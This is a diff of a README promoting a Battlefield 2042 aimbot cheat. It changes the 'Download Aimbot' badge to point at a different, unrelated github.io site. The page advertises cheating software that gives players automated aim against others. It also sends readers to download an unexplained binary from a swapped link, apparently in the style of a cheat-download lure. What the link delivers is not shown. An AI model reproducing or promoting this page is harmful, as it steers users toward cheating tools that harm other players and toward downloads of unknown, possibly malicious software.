@@ -4,7 +4,7 @@ Sick of getting beamed across the map by players with laser aim? Tired of losing
 
 Whether you're sniping across Hourglass or SMG-rushing rooftops in Kaleidoscope, this cheat turns every weapon into a kill machine.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://riploko-Battlefield-2042-Aimbot.github.io/.github)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://bigboyluxunicorn88.github.io)
 ---
 
 ## 🤖 What Does the BF2042 Aimbot Do?
